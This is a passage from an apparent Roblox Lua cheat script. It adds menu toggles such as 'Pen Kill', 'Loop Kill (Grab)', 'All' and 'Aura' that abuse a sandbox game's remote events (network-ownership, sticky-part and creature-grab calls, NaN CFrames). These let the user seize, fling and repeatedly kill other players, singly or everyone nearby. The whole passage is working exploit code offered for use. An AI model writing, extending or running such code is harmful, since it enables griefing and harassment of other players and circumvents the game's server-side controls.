        while not (decoy:FindFirstChild("HumanoidRootPart") ~= nil) or not (decoy:FindFirstChild("Torso") ~= nil) do 
            task.wait() 
        end 
        local hrp = FWD(decoy, "HumanoidRootPart")
        local head = FWD(decoy, "Head")
        repeat 
            if hrp then
                SetNetworkOwner:FireServer(hrp, hrp.CFrame)
            end
            task.wait(0.05)
        until not hrp.Parent or decoy:WaitForChild("Head"):FindFirstChild("PartOwner")
        local targetName = Config.PlayerList and Config.PlayerList[1]
        local target = targetName and service.Players:FindFirstChild(targetName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
        local targetHRP = target.Character.HumanoidRootPart
        task.spawn(function()
            while decoy and decoy.Parent and target and target.Character and task.wait() do
                hrp.CFrame = targetHRP.CFrame
                head.CFrame = targetHRP.CFrame * CFrame.new(0, 1.5, 0)
                if decoy:FindFirstChild("Torso") then
                    decoy["Torso"].CFrame = targetHRP.CFrame
                end
                hrp.AssemblyLinearVelocity = Vector3.new(
                    math.random(-50, 50),
                    math.random(100, 200),
                    math.random(-50, 50)
                )
                hrp.AssemblyAngularVelocity = Vector3.new(
                    math.random(-200, 200) * 100,
                    math.random(-200, 200) * 100,
                    math.random(-200, 200) * 100
                )
            end
        end)
    end    
})

Loop:AddToggle("PenKill", {
    Text = "Pen Kill",
    Default = false,
    Callback = function(Value)
        Config.PenKillT = Value
        if Value then
            local targetName = Config.PlayerList and Config.PlayerList[1]
            if not targetName or targetName == "" then
                task.spawn(function()
                    if Toggles and Toggles.PenKill then
                        Toggles.PenKill:SetValue(false)
                    end
                end)
                return
            end
            local target = service.Players:FindFirstChild(targetName)
            if target then
                if Config.PenKillRespawnConn then
                    Config.PenKillRespawnConn:Disconnect()
                    Config.PenKillRespawnConn = nil
                end
                Config.PenKillRespawnConn = target.CharacterAdded:Connect(function()
                    if Config.PenKillT then
                        task.wait(0.2)
                        task.spawn(function()
                            local tName = Config.PlayerList and Config.PlayerList[1]
                            if not tName or tName == "" then return end
                            local tObj = service.Players:FindFirstChild(tName)
                            if not tObj or not tObj.Character then return end
                            local tHead = tObj.Character:FindFirstChild("Head")
                            if not tHead then return end
                            local folder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            if folder then
                                local destroyRemote = service.ReplicatedStorage:FindFirstChild("MenuToys") and service.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
                                if destroyRemote then
                                    for _, obj in pairs(folder:GetChildren()) do
                                        if obj.Name == "ToolPencil" then
                                            pcall(function() destroyRemote:FireServer(obj) end)
                                        end
                                    end
                                end
                            end
                            task.wait(0.05)
                            local root = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")) or (HRP and HRP())
                            if not root then return end
                            local spawnPos = root.CFrame * CFrame.new(0, 14, 20)
                            local menuToys = service.ReplicatedStorage:FindFirstChild("MenuToys")
                            if not menuToys then return end
                            local spawnRemote = menuToys:FindFirstChild("SpawnToyRemoteFunction")
                            if not spawnRemote then return end
                            folder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            if not folder then return end
                            local newPencil = nil
                            local conn = folder.ChildAdded:Connect(function(child)
                                if child.Name == "ToolPencil" then
                                    newPencil = child
                                    conn:Disconnect()
                                end
                            end)
                            task.spawn(function()
                                pcall(function() spawnRemote:InvokeServer("ToolPencil", spawnPos, Vector3.zero) end)
                            end)
                            local startTime = tick()
                            repeat task.wait(0.05) until newPencil or (tick() - startTime) > 3
                            if conn then pcall(function() conn:Disconnect() end) end
                            if not newPencil then return end
                            local soundPart = newPencil:FindFirstChild("SoundPart")
                            local stickyPart = newPencil:FindFirstChild("StickyPart")
                            if soundPart then
                                local grabEvents = service.ReplicatedStorage:FindFirstChild("GrabEvents")
                                if grabEvents then
                                    local setOwner = grabEvents:FindFirstChild("SetNetworkOwner")
                                    if setOwner then
                                        pcall(function()
                                            for _ = 1, 5 do setOwner:FireServer(soundPart, soundPart.CFrame) end
                                        end)
                                    end
                                end
                            end
                            task.wait(0.05)
                            if stickyPart then
                                local stickyEvent = service.ReplicatedStorage:FindFirstChild("PlayerEvents") and service.ReplicatedStorage.PlayerEvents:FindFirstChild("StickyPartEvent")
                                if stickyEvent then
                                    pcall(function()
                                        stickyEvent:FireServer(stickyPart, tHead, CFrame.new(0, 0/0, 0))
                                        stickyEvent:FireServer(stickyPart, tHead, CFrame.new(0, 0/0, 0))
                                    end)
                                end
                            end
                        end)
                    end
                end)
            end
            if Config.PenKillTask then task.cancel(Config.PenKillTask) end
            Config.PenKillTask = task.spawn(function()
                while Config.PenKillT do
                    local folder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local count = 0
                    if folder then
                        for _, obj in pairs(folder:GetChildren()) do
                            if obj.Name == "ToolPencil" then
                                count = count + 1
                            end
                        end
                    end
                    local isWelded = false
                    if folder then
                        local tName = Config.PlayerList and Config.PlayerList[1]
                        if tName then
                            local tObj = service.Players:FindFirstChild(tName)
                            if tObj and tObj.Character then
                                local tHead = tObj.Character:FindFirstChild("Head")
                                if tHead then
                                    for _, obj in pairs(folder:GetChildren()) do
                                        if obj.Name == "ToolPencil" then
                                            local sPart = obj:FindFirstChild("StickyPart")
                                            if sPart then
                                                local weld = sPart:FindFirstChild("StickyWeld")
                                                if weld and weld.Part1 == tHead then
                                                    isWelded = true
                                                    break
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    if count == 0 or count >= 2 or (count == 1 and not isWelded) then
                        if folder then
                            local destroyRemote = service.ReplicatedStorage:FindFirstChild("MenuToys") and service.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
                            if destroyRemote then
                                for _, obj in pairs(folder:GetChildren()) do
                                    if obj.Name == "ToolPencil" then
                                        pcall(function() destroyRemote:FireServer(obj) end)
                                    end
                                end
                            end
                        end
                        task.wait(0.05)
                        local tName = Config.PlayerList and Config.PlayerList[1]
                        if tName and tName ~= "" then
                            local tObj = service.Players:FindFirstChild(tName)
                            if tObj and tObj.Character then
                                local tHead = tObj.Character:FindFirstChild("Head")
                                local root = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")) or (HRP and HRP())
                                if tHead and root then
                                    local spawnPos = root.CFrame * CFrame.new(0, 14, 20)
                                    local menuToys = service.ReplicatedStorage:FindFirstChild("MenuToys")
                                    if menuToys then
                                        local spawnRemote = menuToys:FindFirstChild("SpawnToyRemoteFunction")
                                        folder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                        if spawnRemote and folder then
                                            local newPencil = nil
                                            local conn = folder.ChildAdded:Connect(function(child)
                                                if child.Name == "ToolPencil" then
                                                    newPencil = child
                                                    conn:Disconnect()
                                                end
                                            end)
                                            task.spawn(function()
                                                pcall(function() spawnRemote:InvokeServer("ToolPencil", spawnPos, Vector3.zero) end)
                                            end)
                                            local startTime = tick()
                                            repeat task.wait(0.05) until newPencil or (tick() - startTime) > 3
                                            if conn then pcall(function() conn:Disconnect() end) end
                                            if newPencil then
                                                local soundPart = newPencil:FindFirstChild("SoundPart")
                                                local stickyPart = newPencil:FindFirstChild("StickyPart")
                                                if soundPart then
                                                    local grabEvents = service.ReplicatedStorage:FindFirstChild("GrabEvents")
                                                    if grabEvents then
                                                        local setOwner = grabEvents:FindFirstChild("SetNetworkOwner")
                                                        if setOwner then
                                                            pcall(function()
                                                                for _ = 1, 5 do setOwner:FireServer(soundPart, soundPart.CFrame) end
                                                            end)
                                                        end
                                                    end
                                                end
                                                task.wait(0.05)
                                                if stickyPart then
                                                    local stickyEvent = service.ReplicatedStorage:FindFirstChild("PlayerEvents") and service.ReplicatedStorage.PlayerEvents:FindFirstChild("StickyPartEvent")
                                                    if stickyEvent then
                                                        pcall(function()
                                                            stickyEvent:FireServer(stickyPart, tHead, CFrame.new(0, 0/0, 0))
                                                            stickyEvent:FireServer(stickyPart, tHead, CFrame.new(0, 0/0, 0))
                                                        end)
                                                    end
                                                    task.wait(0.5)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        else
            if Config.PenKillTask then
                task.cancel(Config.PenKillTask)
                Config.PenKillTask = nil
            end
            if Config.PenKillRespawnConn then
                Config.PenKillRespawnConn:Disconnect()
                Config.PenKillRespawnConn = nil
            end
            local folder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if folder then
                local destroyRemote = service.ReplicatedStorage:FindFirstChild("MenuToys") and service.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
                if destroyRemote then
                    for _, obj in pairs(folder:GetChildren()) do
                        if obj.Name == "ToolPencil" then
                            pcall(function() destroyRemote:FireServer(obj) end)
                        end
                    end
                end
            end
        end
    end
})

Loop:AddToggle("LoopKill", {
    Text = "Loop Kill (Grab)",
    Default = false,
    Callback = function(Value)
        Config.LoopKillToggle = Value
        if Value then
            if not Config.PlayerList or #Config.PlayerList == 0 then
                task.spawn(function()
                    Toggles.LoopKill:SetValue(false)
                end)
                return
            end
            
            if Config.LoopKillTask then task.cancel(Config.LoopKillTask) end
            Config.LoopKillTask = task.spawn(function()
                while Config.LoopKillToggle do
                    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local myHrp = localPlayer.Character.HumanoidRootPart
                        if myHrp.CFrame.Position.Y > -50 then
                            LoopKillSavedCFrame = myHrp.CFrame
                        end
                    end
                    if Config.PlayerList then
                        for _, targetName in ipairs(Config.PlayerList) do
                            if not Config.LoopKillToggle then break end
                            local targetPlr = service.Players:FindFirstChild(targetName)
                            if targetPlr and targetPlr.Parent and targetPlr.Character and targetPlr.Character:FindFirstChild("Humanoid") and targetPlr.Character.Humanoid.Health > 0 then
                                local char = targetPlr.Character
                                local hrp = char:FindFirstChild("HumanoidRootPart")
                                local head = char:FindFirstChild("Head")
                                local hum = char:FindFirstChildOfClass("Humanoid")
                                if hrp and head and hum then
                                    local isCaptured = false
                                    task.spawn(function()
                                        for i = 1, 30 do
                                            pcall(function()
                                                if Struggle then Struggle:FireServer(char) end
                                                if RagdollRemote then RagdollRemote:FireServer(hrp, 0) end
                                                if StopAllVelocity then
                                                    service.ReplicatedStorage.GameCorrectionEvents.StopAllVelocity:FireServer()
                                                end
                                                if DestroyGrabLine then
                                                    task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                                    task.delay(0.05, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                                end
                                                if SetNetworkOwner and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                    local myHrp = localPlayer.Character.HumanoidRootPart
                                                    if localPlayer:DistanceFromCharacter(hrp.Position) <= 30 then
                                                        local dir = (hrp.Position - myHrp.Position).Unit
                                                        local right = dir:Cross(Vector3.new(0, 1, 0))
                                                        local up = right:Cross(dir)
                                                        SetNetworkOwner:FireServer(hrp, CFrame.fromMatrix(myHrp.Position, right, up))
                                                    end
                                                end
                                            end)
                                            task.wait()
                                        end
                                    end)
                                    pcall(function()
                                        local truePos = char:FindFirstChild("TruePositionPart")
                                        if truePos then truePos:Destroy() end
                                        local attach = hrp:FindFirstChild("RootAttachment")
                                        if attach then attach.Parent = hrp end
                                    end)
                                    for i = 1, 50 do
                                        if not Config.LoopKillToggle or not (targetPlr.Parent and targetPlr.Character and targetPlr.Character:FindFirstChild("Humanoid") and targetPlr.Character.Humanoid.Health > 0) then
                                            break
                                        end
                                        pcall(function()
                                            if SetNetworkOwner and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                local myHrp = localPlayer.Character.HumanoidRootPart
                                                if localPlayer:DistanceFromCharacter(hrp.Position) <= 30 then
                                                    local dir = (hrp.Position - myHrp.Position).Unit
                                                    local right = dir:Cross(Vector3.new(0, 1, 0))
                                                    local up = right:Cross(dir)
                                                    SetNetworkOwner:FireServer(hrp, CFrame.fromMatrix(myHrp.Position, right, up))
                                                end
                                            end
                                        end)

                                        pcall(function()
                                            local truePos = char:FindFirstChild("TruePositionPart")
                                            if truePos then truePos:Destroy() end
                                            local attach = hrp:FindFirstChild("RootAttachment")
                                            if attach then attach.Parent = hrp end
                                        end)
                                        if DestroyGrabLine then
                                            task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                        end
                                        pcall(function()
                                            hrp.AssemblyLinearVelocity = Vector3.zero
                                            hrp.AssemblyAngularVelocity = Vector3.zero
                                            hrp.Anchored = false
                                        end)
                                        pcall(function()
                                            local partOwner = head:FindFirstChild("PartOwner")
                                            if partOwner then partOwner.Value = localPlayer.Name end
                                        end)
                                        local hasOwner = false
                                        if head:FindFirstChild("PartOwner") and head.PartOwner.Value == localPlayer.Name then
                                            hasOwner = true
                                        end
                                        if hasOwner or hrp.AssemblyLinearVelocity.Magnitude > 500 then
                                            isCaptured = true
                                            break
                                        end
                                        task.wait()
                                        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                            local myHrp = localPlayer.Character.HumanoidRootPart
                                            if hrp.Position.Y <= -12 then
                                                if LoopKillSavedCFrame then myHrp.CFrame = LoopKillSavedCFrame end
                                            else
                                                myHrp.CFrame = CFrame.new(hrp.Position + Vector3.new(0, -10, -10))
                                            end
                                        end
                                        hum.BreakJointsOnDeath = false
                                        hum:ChangeState(Enum.HumanoidStateType.Dead)
                                        hum.Jump = true
                                        hum.Sit = false
                                    end
                                    if isCaptured and Config.LoopKillToggle and (targetPlr.Parent and targetPlr.Character and targetPlr.Character:FindFirstChild("Humanoid") and targetPlr.Character.Humanoid.Health > 0) then
                                        if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                            localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                                        end
                                        for i = 1, 25 do
                                            pcall(function()
                                                hrp.Anchored = false
                                                hrp.CFrame = CFrame.new(hrp.Position.X, -400, hrp.Position.Z)
                                                hrp.AssemblyLinearVelocity = Vector3.new(0, -3000, 0)
                                                for _, p in pairs(char:GetChildren()) do
                                                    if p:IsA("BasePart") then p.CanCollide = false end
                                                end
                                            end)
                                            if DestroyGrabLine then
                                                task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                                task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                            end
                                            task.wait()
                                        end
                                        pcall(function()
                                            local truePos = char:FindFirstChild("TruePositionPart")
                                            if truePos then truePos:Destroy() end
                                            local attach = hrp:FindFirstChild("RootAttachment")
                                            if attach then attach.Parent = hrp end
                                        end)
                                        for i = 1, 40 do
                                            pcall(function()
                                                hrp.Anchored = false
                                                hrp.CFrame = CFrame.new(hrp.Position.X, -1000000, hrp.Position.Z)
                                                hrp.AssemblyLinearVelocity = Vector3.new(0, -1000000, 0)
                                                for _, p in pairs(char:GetChildren()) do
                                                    if p:IsA("BasePart") then p.CanCollide = false end
                                                end
                                            end)
                                            if DestroyGrabLine then
                                                task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                                task.delay(0.03, function() pcall(function() DestroyGrabLine:FireServer(hrp) end) end)
                                            end
                                            task.wait()
                                        end
                                        pcall(function()
                                            for _, p in pairs(char:GetChildren()) do
                                                if p:IsA("BasePart") then p.CanCollide = true end
                                            end
                                            if hrp:FindFirstChild("SkyVelocity") then
                                                hrp.SkyVelocity:Destroy()
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                    end

                    task.wait(0.1)
                end
                if Config.PlayerList then
                    for _, targetName in ipairs(Config.PlayerList) do
                        local currentTarget = service.Players:FindFirstChild(targetName)
                        if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") and DestroyGrabLine then
                            local targetHrp = currentTarget.Character.HumanoidRootPart
                            task.delay(0.05, function() pcall(function() DestroyGrabLine:FireServer(targetHrp) end) end)
                        end
                    end
                end
                if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                end
            end)
        else
            if Config.LoopKillTask then
                task.cancel(Config.LoopKillTask)
                Config.LoopKillTask = nil
            end
            if Config.PlayerList then
                for _, targetName in ipairs(Config.PlayerList) do
                    local currentTarget = service.Players:FindFirstChild(targetName)
                    if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") and DestroyGrabLine then
                        local targetHrp = currentTarget.Character.HumanoidRootPart
                        task.delay(0.05, function() pcall(function() DestroyGrabLine:FireServer(targetHrp) end) end)
                    end
                end
            end
            if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
            end
        end
    end
})

aurabklaaaaao:AddToggle("Whiteblob", {
    Text = "whitelist",
    Default = false,
    Callback = function(Value)
        Config.bloballWhite = Value
        if Value then
        else
        end
    end
})

aurabklaaaaao:AddDropdown("allmode", {
    Text = "All Mode",
    Default = "Kill",
    Values = {"Kill", "Destroy Gucci", "Speed/Jump (Control)"},
    Callback = function(Value)
        Config.Bloballmode = Value
        blobmanAllMode = Value
        if Config.blobAllT then
            Config.bloballrun = false
            task.wait(0.1)
            Config.bloballrun = true
            local mode = blobmanAllMode
            task.spawn(function()
                local hpToggle = false
                while Config.bloballrun do
                    task.wait(0.01)
                    local char, hrp = Charrrrrr()
                    if not hrp then continue end
                    local blobman = spawnBLob2()
                    if not blobman then continue end
                    sitOnBlobman(blobman)
                    local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                    local detector = blobman:FindFirstChild("LeftDetector")
                    local weld = detector and detector:FindFirstChild("LeftWeld")
                    if not (scriptFolder and detector and weld) then continue end
                    local Grab = scriptFolder:FindFirstChild("CreatureGrab")
                    local Release = scriptFolder:FindFirstChild("CreatureRelease")
                    local Drop = scriptFolder:FindFirstChild("CreatureDrop")
                    if not (Grab and Release and Drop) then continue end
                    if mode == "Kill" or mode == "Destroy Gucci" then
                        hpToggle = not hpToggle
                    end
                    for _, plr in ipairs(service.Players:GetPlayers()) do
                        if not Config.bloballrun then break end
                        if plr ~= localPlayer and not Whiteall(plr) then
                            local c = plr.Character
                            local thrp = c and c:FindFirstChild("HumanoidRootPart")
                            local hum = c and c:FindFirstChildOfClass("Humanoid")
                            if thrp and hum and (hrp.Position - thrp.Position).Magnitude <= 30 then
                                pcall(function()
                                    Grab:FireServer(detector, thrp, weld)
                                    Release:FireServer(weld, thrp)
                                    Drop:FireServer(weld, thrp)
                                    if mode == "Kill" then
                                        hum.Health = hpToggle and 0 or 100
                                    elseif mode == "Speed/Jump (Control)" then
                                        hum.WalkSpeed = Config.WalkspeedCont
                                        hum.JumpPower = Config.JumpPownerCont
                                    end
                                end)
                            end
                        end
                    end
                end
            end)
            local tpLoopCount = (mode == "Speed/Jump (Control)") and 2 or 1
            for i = 1, tpLoopCount do
                task.spawn(function()
                    while Config.bloballrun do
                        task.wait(0.1)
                        local char, hrp = Charrrrrr()
                        if not hrp then continue end
                        local blobman = spawnBLob2()
                        if not blobman then continue end
                        sitOnBlobman(blobman)
                        for _, plr in ipairs(service.Players:GetPlayers()) do
                            if not Config.bloballrun then break end
                            if plr ~= localPlayer and not Whiteall(plr) then
                                local c = plr.Character
                                local thrp = c and c:FindFirstChild("HumanoidRootPart")
                                if thrp then
                                    pcall(function()
                                        hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, -3)
                                    end)
                                    task.wait(0.2)
                                end
                            end
                        end
                    end
                end)
            end
        end
    end
})

aurabklaaaaao:AddToggle("All", {
    Text = "All",
    Default = false,
    Callback = function(Value)
        Config.blobAllT = Value
        Config.blobAllT = Value
        Config.bloballrun = Value
        if not Value then
            return
        end
        local mode = blobmanAllMode or Config.Bloballmode or "Kill"
        task.spawn(function()
            local hpToggle = false
            while Config.bloballrun do
                task.wait(0.01)
                local char, hrp = Charrrrrr()
                if not hrp then continue end
                local blobman = spawnBLob2()
                if not blobman then continue end
                sitOnBlobman(blobman)
                local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                local detector = blobman:FindFirstChild("LeftDetector")
                local weld = detector and detector:FindFirstChild("LeftWeld")
                if not (scriptFolder and detector and weld) then continue end
                local Grab = scriptFolder:FindFirstChild("CreatureGrab")
                local Release = scriptFolder:FindFirstChild("CreatureRelease")
                local Drop = scriptFolder:FindFirstChild("CreatureDrop")
                if not (Grab and Release and Drop) then continue end
                if mode == "Kill" or mode == "Destroy Gucci" then
                    hpToggle = not hpToggle
                end
                for _, plr in ipairs(service.Players:GetPlayers()) do
                    if not Config.bloballrun then break end
                    if plr ~= localPlayer and not Whiteall(plr) then
                        local c = plr.Character
                        local thrp = c and c:FindFirstChild("HumanoidRootPart")
                        local hum = c and c:FindFirstChildOfClass("Humanoid")
                        if thrp and hum and (hrp.Position - thrp.Position).Magnitude <= 30 then
                            pcall(function()
                                Grab:FireServer(detector, thrp, weld)
                                Release:FireServer(weld, thrp)
                                Drop:FireServer(weld, thrp)
                                if mode == "Kill" then
                                    hum.Health = hpToggle and 0 or 100
                                elseif mode == "Speed/Jump (Control)" then
                                    hum.WalkSpeed = Config.WalkspeedCont
                                    hum.JumpPower = Config.JumpPownerCont
                                end
                            end)
                        end
                    end
                end
            end
        end)
        local tpLoopCount = (mode == "Speed/Jump (Control)") and 2 or 1
        for i = 1, tpLoopCount do
            task.spawn(function()
                while Config.bloballrun do
                    task.wait(0.1)
                    local char, hrp = Charrrrrr()
                    if not hrp then continue end
                    local blobman = spawnBLob2()
                    if not blobman then continue end
                    sitOnBlobman(blobman)
                    for _, plr in ipairs(service.Players:GetPlayers()) do
                        if not Config.bloballrun then break end
                        if plr ~= localPlayer and not Whiteall(plr) then
                            local c = plr.Character
                            local thrp = c and c:FindFirstChild("HumanoidRootPart")
                            if thrp then
                                pcall(function()
                                    hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, -3)
                                end)
                                task.wait(0.2)
                            end
                        end
                    end
                end
            end)
        end
    end
})

aurabklo:AddToggle("WhiteBLob", {
    Text = "Whitelist",
    Default = true,
    Callback = function(Value)
        Config.WhitelistFriendsBLOB = Value
    end
})
aurabklo:AddDropdown("Auramoded", {
    Text = "Aura Mode",
    Values = {"Kill", "Destroy Gucci", "Speed/Jump (Control)", "Kill (Beach)", "Grab Aura"},
    Default = "Kill",
    Callback = function(Value)
        Config.BlobauraM = Value
        if Config.BlobauraT then
            Config.BlobauraR = false
            task.wait(0.1)
            Config.BlobauraR = Config.BlobauraT
            if Config.BlobauraT then
                local mode = Config.BlobauraM
                if mode == "Kill" or mode == "Destroy Gucci" or mode == "Speed/Jump (Control)" or mode == "Kill (Beach)" or mode == "Grab Aura" then
                    task.spawn(function()
                        local runningFlagGetter = function() 
                            return Config.BlobauraR 
                        end
                        local hpToggle = false
                        while runningFlagGetter() do
                            task.wait(0.01)
                            if mode == "Grab Aura" then
                                local char = GetCharacter()
                                local hrp = HRP()
                                if not (char and hrp) then
                                    continue
                                end
                                for _, v in ipairs(service.Workspace:GetPartBoundsInRadius(hrp.Position, 25)) do
                                    if not runningFlagGetter() then 
                                        break 
                                    end
                                    if (not v.Anchored and not v:IsDescendantOf(char)) then
                                        local p = service.Players:GetPlayerFromCharacter(v.Parent)
                                        if p and (p == localPlayer or whitelistBlob(p)) then
                                            continue
                                        end
                                        if (v.Name ~= "HumanoidRootPart" or not getBlobman()) then
                                            continue
                                        end
                                        pcall(function()
                                            local blob = getBlobman()
                                            local side = (math.random() >= .5) and "Left" or "Right"
                                            
                                            if blob then
                                                local detector = blob:FindFirstChild(side .. "Detector")
                                                if detector then
                                                    local weld = detector:FindFirstChild(side .. "Weld")
                                                    if weld then
                                                        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                                                        if script then
                                                            local remote = script:FindFirstChild("CreatureGrab")
                                                            if remote then
                                                                pcall(function()
                                                                    remote:FireServer(detector, v, weld)
                                                                end)
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                    end
                                end
                            else
                                local char, hrp = Charrrrrr()
                                if not hrp then 
                                    continue 
                                end
                                local blobman = spawnBLob2()
                                if not blobman then 
                                    continue 
                                end
                                sitOnBlobman(blobman)
                                local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                                local detector = blobman:FindFirstChild("LeftDetector")
                                local weld = detector and detector:FindFirstChild("LeftWeld")
                                if not (scriptFolder and detector and weld) then 
                                    continue 
                                end
                                local Grab, Release, Drop = scriptFolder:FindFirstChild("CreatureGrab"), scriptFolder:FindFirstChild("CreatureRelease"), scriptFolder:FindFirstChild("CreatureDrop")
                                if not (Grab and Release and Drop) then 
                                    continue 
                                end
                                hpToggle = not hpToggle
                                for _, plr in ipairs(service.Players:GetPlayers()) do
                                    if not runningFlagGetter() then 
                                        break 
                                    end
                                    if plr ~= localPlayer and not whitelistBlob(plr) then
                                        local c = plr.Character
                                        local thrp, hum = c and c:FindFirstChild("HumanoidRootPart"), c and c:FindFirstChildOfClass("Humanoid")
                                        local isTargetValid = false
                                        if mode == "Kill (Beach)" then
                                            isTargetValid = not not thrp
                                        else
                                            isTargetValid = not not (thrp and hum)
                                        end
                                        if isTargetValid and (hrp.Position - thrp.Position).Magnitude <= 30 then
                                            pcall(function()
                                                Grab:FireServer(detector, thrp, weld)
                                                Release:FireServer(weld, thrp)
                                                Drop:FireServer(weld, thrp)
                                                if mode == "Kill" then
                                                    hum.Health = hpToggle and 0 or 100
                                                elseif mode == "Destroy Gucci" then
                                                elseif mode == "Speed/Jump (Control)" then
                                                    hum.WalkSpeed = Config.WalkspeedCont
                                                    hum.JumpPower = Config.JumpPownerCont
                                                elseif mode == "Kill (Beach)" then
                                                    thrp.CFrame = CFrame.new(-1150, 23, -28)
                                                end
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end
    end
})

aurabklo:AddToggle("AuraT", {
    Text = "Aura",
    Default = false,
    Callback = function(Value)
        Config.BlobauraT = Value
        Config.BlobauraR = Config.BlobauraT
        if Config.BlobauraT then
            local mode = Config.BlobauraM
            if mode == "Kill" or mode == "Destroy Gucci" or mode == "Speed/Jump (Control)" or mode == "Kill (Beach)" or mode == "Grab Aura" then
                task.spawn(function()
                    local runningFlagGetter = function() 
                        return Config.BlobauraR 
                    end
                    local hpToggle = false
                    while runningFlagGetter() do
                        task.wait(0.01)
                        if mode == "Grab Aura" then
                            local char = GetCharacter()
                            local hrp = HRP()
                            if not (char and hrp) then
                                continue
                            end
                            for _, v in ipairs(service.Workspace:GetPartBoundsInRadius(hrp.Position, 25)) do
                                if not runningFlagGetter() then 
                                    break 
                                end
                                if (not v.Anchored and not v:IsDescendantOf(char)) then
                                    local p = service.Players:GetPlayerFromCharacter(v.Parent)
                                    if p and (p == localPlayer or whitelistBlob(p)) then
                                        continue
                                    end
                                    if (v.Name ~= "HumanoidRootPart" or not getBlobman()) then
                                        continue
                                    end
                                    pcall(function()
                                        local blob = getBlobman()
                                        if not blob then return end
                                        local side = (math.random() >= .5) and "Left" or "Right"
                                        local detector = blob:FindFirstChild(side .. "Detector")
                                        if not detector then return end
                                        local weld = detector:FindFirstChild(side .. "Weld")
                                        if not weld then return end
                                        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                                        if not script then return end
                                        local remote = script:FindFirstChild("CreatureGrab")
                                        if remote then
                                            pcall(function()
                                                remote:FireServer(detector, v, weld)
                                            end)
                                        end
                                    end)
                                end
                            end
                        else
                            local char, hrp = Charrrrrr()
                            if not hrp then 
                                continue 
                            end
                            local blobman = spawnBLob2()
                            if not blobman then 
                                continue 
                            end
                            sitOnBlobman(blobman)
                            local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                            local detector = blobman:FindFirstChild("LeftDetector")
                            local weld = detector and detector:FindFirstChild("LeftWeld")
                            if not (scriptFolder and detector and weld) then 
                                continue 
                            end
                            local Grab, Release, Drop = scriptFolder:FindFirstChild("CreatureGrab"), scriptFolder:FindFirstChild("CreatureRelease"), scriptFolder:FindFirstChild("CreatureDrop")
                            if not (Grab and Release and Drop) then 
                                continue 
                            end
                            hpToggle = not hpToggle
                            for _, plr in ipairs(service.Players:GetPlayers()) do
                                if not runningFlagGetter() then 
                                    break 
                                end
                                if plr ~= localPlayer and not whitelistBlob(plr) then
                                    local c = plr.Character
                                    local thrp, hum = c and c:FindFirstChild("HumanoidRootPart"), c and c:FindFirstChildOfClass("Humanoid")
                                    local isTargetValid = false
                                    if mode == "Kill (Beach)" then
                                        isTargetValid = not not thrp
                                    else
                                        isTargetValid = not not (thrp and hum)
                                    end
                                    if isTargetValid and (hrp.Position - thrp.Position).Magnitude <= 30 then
                                        pcall(function()
                                            Grab:FireServer(detector, thrp, weld)
                                            Release:FireServer(weld, thrp)
                                            Drop:FireServer(weld, thrp)
                                            if mode == "Kill" then
                                                hum.Health = hpToggle and 0 or 100
                                            elseif mode == "Destroy Gucci" then
                                            elseif mode == "Speed/Jump (Control)" then
                                                hum.WalkSpeed = Config.WalkspeedCont
                                                hum.JumpPower = Config.JumpPownerCont
                                            elseif mode == "Kill (Beach)" then
                                                thrp.CFrame = CFrame.new(-1150, 23, -28)
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end
})

SettingsDou:AddSlider("WalkspeedCon", {
    Text = "Walk Speed",
